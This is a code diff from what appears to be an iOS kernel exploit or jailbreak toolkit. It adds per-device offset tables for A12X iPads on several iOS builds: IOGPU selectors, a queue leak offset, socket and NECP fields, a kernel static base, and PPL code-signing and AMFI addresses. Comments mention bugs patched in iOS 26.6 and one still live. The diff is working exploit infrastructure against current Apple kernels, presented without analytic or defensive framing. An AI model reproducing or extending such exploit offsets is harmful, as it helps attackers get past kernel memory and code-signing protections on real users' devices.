@@ -143,6 +143,84 @@ static LabOffTab gA12X_23G71 = {
     .build_string = "23G71"
 };
 
+/* A12X FIELD# row — iPad8,* on any build that is not the 23G71 Ghidra pin.
+   Queue 0x408 / leak +0x550 / MD +0x90 / static_base / icmp6filt 0x148 /
+   socket_usecount 0x23c are xnu/IOGPU class and may transfer. Unslid VAs
+   (CheckandPrewire, AMFI, fn4, AVE, AKS, panic PCs) stay 0 so probes HOLD
+   instead of smashing T8020 23G71 text onto 23H30/23H24/23G82.
+   43748 patched in iOS 26.6; 64788 Facet A live until 23G82 / 26.6.1.
+   fill_cap=1: A12X CheckandPrewire count gate. ane_table_size=0: do not
+   claim 0x820 geometry after the 26.6 patch. PPL-only AfterKread. */
+#define LAB_A12X_FIELD_BODY \
+    .sel36 = A12X_23G71_IOGPU_SEL36, \
+    .sel36_scin = A12X_23G71_IOGPU_SEL36_SCIN, \
+    .sel36_scout = A12X_23G71_IOGPU_SEL36_SCOUT, \
+    .sel36_len = A12X_23G71_IOGPU_SEL36_LEN, \
+    .res_type = A12X_23G71_IOGPU_RES_TYPE_BYTES, \
+    .res_size = A12X_23G71_IOGPU_RES_SIZE, \
+    .res_id_off = A14_23F77_IOGPU_RES_ID_OFF, \
+    .res_devw_off = A14_23F77_IOGPU_RES_DEVW_OFF, \
+    .devw_conn_off = A14_23F77_IOGPU_DEVW_CONN_OFF, \
+    .mag_cap = 8, \
+    .sysmem_md = A12X_23G71_SYSMEM_MD_OFF, \
+    .iosurface_md = 0x30u, \
+    .gmd_elemsz = A12X_23G71_GMD_ELEMSZ, \
+    .queue_create_sel = A12X_23G71_IOGPU_QUEUE_CREATE_SEL, \
+    .queue_create_size = A12X_23G71_IOGPU_QUEUE_CREATE_SIZE, \
+    .queue_destroy_sel = A12X_23G71_IOGPU_QUEUE_DESTROY_SEL, \
+    .submit_sel = A12X_23G71_IOGPU_QUEUE_SUBMIT_SEL, \
+    .new_resource_sel = 8, \
+    .sel7_min_in = 0x408u, \
+    .queue_leak = A12X_23G71_IOGPU_QUEUE_LEAK, \
+    .socket_usecount = A12X_23G71_SOCKET_USECOUNT, \
+    .so_necp = A12X_23G71_SO_NECP_ATTRIBUTES, \
+    .sol_socket = 0xffff, \
+    .necp_tlv = 0x07, \
+    .necp_str_len = 255, \
+    .static_base = A12X_23G71_STATIC_BASE, \
+    .pmap_cs_allow_off = A12X_23G71_PMAP_CS_ALLOW_OFF, \
+    .amfi_sel_copy = 0, \
+    .amfi_sel_manifest = 0, \
+    .owns_replaceable = 0, \
+    .ane_fill_cap = 1, \
+    .ane_table_size = 0, \
+    .ane_table_entries = 0, \
+    .ane_trigger_inputs = 0, \
+    .ane_next_chunk_index = 0, \
+    .ane_checkandprewire = 0, \
+    .ane_memorymap = 0, \
+    .ane_alloc_type_desc = 0, \
+    .fn4 = 0, \
+    .getter = 0, \
+    .replace_bytes = 0, \
+    .cluster_w = 0, \
+    .cluster_r = 0, \
+    .ave_close = 0, \
+    .ave_stop = 0, \
+    .ave_async = 0, \
+    .aks_wvek_overflow = 0, \
+    .amfi_external = 0, \
+    .amfi_loadtc = 0, \
+    .pmap_cs_allow = 0, \
+    .pmap_load_tc = 0, \
+    .panic_cc8 = 0, \
+    .panic_cd8 = 0, \
+    .panic_d00 = 0
+
+static LabOffTab gA12X_other = {
+    .tag = "A12X_other",
+    LAB_A12X_FIELD_BODY,
+    .build_number = "23H",
+    .build_string = "iPad8,* not 23G71/23H30"
+};
+
+static LabOffTab gA12X_23H30 = {
+    .tag = "A12X_23H30",
+    LAB_A12X_FIELD_BODY,
+    .build_number = BUILD_23H30,
+    .build_string = "23H30"
+};
+
 /* XR_22H311 — iPhone11,* A12 on iOS 18.7.x (22H*; user device 18.7.2, tag
    kept from the original 18.7.5 plan). Dopamine 3.0.11 momentarius covers
    A12 15.0-26.0.1, so this device CAN be jailbroken (PPL exploit ->
@@ -283,8 +361,12 @@ static uint64_t gCurrentKernSlide = 0;
 const LabOffTab *LabOffForSku(LabSku sku) {
     switch (sku) {
         case LabSkuA12X_23G71:
-        case LabSkuA12X_other:
             return &gA12X_23G71;
+        case LabSkuA12X_23H30:
+            return &gA12X_23H30;
+        case LabSkuA12X_other:
+            /* FIELD# only — do not paste T8020 23G71 unslid VAs onto 23H24/23G82/etc. */
+            return &gA12X_other;
         case LabSkuA14_23F77:
         case LabSkuA14_other:
             return &gA14_23F77;
